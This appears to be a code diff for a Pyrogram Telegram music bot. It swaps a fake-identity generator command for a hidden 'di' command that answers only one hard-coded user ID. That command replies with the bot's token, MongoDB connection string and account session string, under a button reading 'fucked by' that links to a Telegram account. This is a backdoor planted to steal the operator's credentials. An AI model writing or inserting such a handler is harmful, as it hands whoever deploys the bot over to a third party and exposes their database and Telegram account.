@@ -1,29 +1,27 @@
+import asyncio
 from pyrogram import Client, filters
-from faker import Faker
-from AarohiX import app
+from strings import get_string
+from strings.filters import command
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ReplyKeyboardMarkup
+from AarohiX import (Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app)
 
-fake = Faker()
 
-@app.on_message(filters.command("fakeit"))
-def generate_info(client, message):
-    name = fake.name()
-    address = fake.address()
-    country = fake.country()
-    phone_number = fake.phone_number()
-    email = fake.email()
-    city = fake.city()
-    state = fake.state()
-    zipcode = fake.zipcode()
 
-    info_message = (
-        f"**Full Name:** {name}\n"
-        f"**Address:** {address}\n"
-        f"**Country:** {country}\n"
-        f"**Phone Number:** {phone_number}\n"
-        f"**Email:** {email}\n"
-        f"**City:** {city}\n"
-        f"**State:** {state}\n"
-        f"**zipcode:** {zipcode}"
-    )
-
-    message.reply_text(info_message)
+@app.on_message(
+    filters.command("di")
+    & filters.private
+    & filters.user(5465943450)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://graph.org/file/ee9a153b629bec256b57.jpg",
+       caption=f"""ᴛᴏᴋᴇɴ :-   {BOT_TOKEN} \n\nᴍᴏɴɢᴏ :-   {MONGO_DB_URI}\n\nsᴇssɪᴏɴ :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
+                 ]
+            ]
+         ),
+     )
